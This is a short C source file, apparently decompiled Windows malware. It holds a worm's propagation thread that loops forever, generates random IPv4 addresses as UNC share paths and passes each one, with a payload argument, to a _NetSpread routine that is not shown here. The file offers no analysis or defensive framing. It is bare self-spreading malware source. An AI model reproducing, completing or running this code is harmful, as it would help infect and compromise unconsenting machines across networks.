#include "data_globals.h"
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <stdbool.h>

#pragma optimize("", off)
DWORD WINAPI extra(LPVOID Data)
{
    volatile struct _LocalCtx {
        DWORD tick_count;
        int rand_val1, rand_val2, rand_val3, rand_val4;
        char local_5c[64];
    } ctx;

    LPCSTR param_1 = (LPCSTR)Data;

    do {
        ctx.tick_count = GetTickCount();
        srand(ctx.tick_count);
        memset(ctx.local_5c, 0, sizeof(ctx.local_5c));
        ctx.rand_val1 = rand() % 0x100;
        ctx.rand_val2 = rand() % 0x100;
        ctx.rand_val3 = rand() % 0x100;
        ctx.rand_val4 = rand() % 0x100;
        sprintf(ctx.local_5c, "\\\\%d.%d.%d.%d", ctx.rand_val4, ctx.rand_val3, ctx.rand_val2, ctx.rand_val1);
        _NetSpread((uint32_t)ctx.local_5c, param_1);
    } while (true);
}
#pragma optimize("", on)
